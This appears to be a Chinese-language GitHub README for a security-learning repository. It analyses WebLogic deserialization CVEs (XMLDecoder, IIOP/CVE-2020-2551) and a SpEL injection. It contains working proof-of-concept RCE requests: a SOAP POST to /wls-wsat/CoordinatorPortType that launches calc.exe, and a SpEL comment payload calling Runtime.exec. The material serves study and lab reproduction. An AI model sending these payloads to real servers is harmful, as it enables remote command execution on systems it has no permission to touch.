# Cybersecurity-Learning-demo
网络安全学习代码样式，主要为Java和PHP

#  Java

## weblogic

Weblogic反序列化漏洞经过了几个阶段，利用技术也有多种变形。

从利用方式来看，只要分为三类：

1、前期是直接通过**T3协议**发送恶意反序列化对象;(*CVE-2015-4582*, *CVE-2016-0638*, *CVE-2016-3510*, *CVE-2020-2555*，*CVE-2020-2883*)

2、后期利用T3协议配合**JRMP**或**JNDI**接口反向发送反序列化数据(*CVE-2017-3248*, *CVE-2018-2628*, *CVE-2018-2893*, *CVE2018-3245*、*CVE-2018-3191*、*CVE-2020-14644*、*CVE-2020-14645*)还有利用**IIOP协议**的*CVE-2020-2551*;

3、 通过**Javabean XML**方式发送反序列化数据。(*CVE-2017-3506*->*CVE-2017-10271*->*CVE-2019-2725*->*CVE-2019-2729*)

###  WebLogic XMLDecoder反序列化

WebLogic XMLDecoder 反序列化RCE（CVE-2017-3506、 CVE-2017-10271、 CVE-2019-2725）

#### 文章参考

 Win7快速部署weblogic **10.3.6** https://blog.csdn.net/counsellor/article/details/114527476

WebLogic XMLDecoder 反序列化RCE分析参考 https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/

weblogic 下载地址 https://pan.baidu.com/s/15urXLHftydGZFpO87DQsbg 提取码：9x26

####  项目配置

1、maven配置

2、引用weblogs安装目录下server的lib库

#### XMLDecoder利用分析链
反序列化RCE
```Java
xmlDecoder.writeObject() //序列化
xmlDecoder.readObject() //反序列化
new ProcessBuilder("calc").start();  //命令执行
new ProcessBuilder("cmd", "/c", "calc").start();//命令执行
```
总结：**XMLDecoder反序列化时能让对象执行指定方法（如上述start）**

原理：**以WebLogic为例，其WLS Security组件对外提供webservice服务时，使用了XMLDecoder来解析用户传入的XML 数据，在解析过程中就出现了反序列化漏洞。**

#### WebLogic利用链分析
复现利用：访问后台，替换请求头，改为Post，在XML数据修改命令即可

POC：
```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.110.77:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 667

<!--wsdl soap协议-->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="1">
                        <void index="0">
                            <string>calc.exe</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>

```

weblogic POC返回包分析调用栈

->*weblogic.wsee.jaxws.workcontext.WorkContextServerTube-*>*processRequest*

->*weblogic.wsee.jaxws.workcontext.WorkContextTube*->*readHeaderOld*

->*weblogic.wsee.jaxws.workcontext.WorkContextServerTube*->*receive*

->*weblogic.workarea.WorkContextMapImpl*->*receiveRequest*

->*weblogic.workarea.WorkContextLocalMap*->*receiveRequest*

->*weblogic.workarea.spi.WorkContextEntryImpl*->*readEntry*

->*weblogic.wsee.workarea.WorkContextXmlInputAdapter*->*readUTF*->*xmlDecoder.readObject()*



###  Weblogic  IIOP协议反序列化（CVE-2020-2551）

#### 1、理解IIOP协议
*IIOP，Internet Inter-ORB Protocol(互联网内部对象请求代理协议)*

项目下三个终端分别执行命令
```shell
orbd -ORBInitialPort 1050 -ORBInitialHost localhost
java.exe -classpath build org.example.Server
java.exe -classpath build org.example.Client
```
总结：**IIOP协议服务端会调用Message的readObject方法，而客户端会调用writeObject方法**

#### 2、利用链分析
Weblogic CVE-2020-2551 IIOP协议反序列化RCE利用链分析

参考： https://mp.weixin.qq.com/s/SQdyXS1LNOgfP7QD93XGaw

**实现Jndi注入**：*JtaTransactionManager*#*readObject:1192*

**实现IIOP协议**：*IIOPInputStream:1725*

入口source点：*readObject:314*, *ObjectStreamClass* (*weblogic.utils.io*)

```java
readObject:1192, JtaTransactionManager (com.bea.core.repackaged.springframework.transaction.jta)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:57, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:601, Method (java.lang.reflect)
    readObject:314, ObjectStreamClass (weblogic.utils.io)
    readValueData:281, ValueHandlerImpl (weblogic.corba.utils)
    readValue:93, ValueHandlerImpl (weblogic.corba.utils)
    read_value:2128, IIOPInputStream (weblogic.iiop)
    read_value:1936, IIOPInputStream (weblogic.iiop)
    read_value_internal:220, AnyImpl (weblogic.corba.idl)
    read_value:115, AnyImpl (weblogic.corba.idl)
    read_any:1648, IIOPInputStream (weblogic.iiop)
    read_any:1641, IIOPInputStream (weblogic.iiop)
    _invoke:84, _NamingContextAnyImplBase (weblogic.corba.cos.naming)
    invoke:249, CorbaServerRef (weblogic.corba.idl)
    invoke:230, ClusterableServerRef (weblogic.rmi.cluster)
    run:522, BasicServerRef$1 (weblogic.rmi.internal)
    doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:146, SecurityManager (weblogic.security.service)
    handleRequest:518, BasicServerRef (weblogic.rmi.internal)
    run:118, WLSExecuteRequest (weblogic.rmi.internal.wls)
    execute:256, ExecuteThread (weblogic.work)
    run:221, ExecuteThread (weblogic.work)
```

## spel RCE

tomecat启动后

post请求

```http
http://localhost:8088/Rce_comment_war/comment
```

body为

```
comment=T(java.lang.Runtime).getRuntime().exec('calc')
```

实现Java代码执行

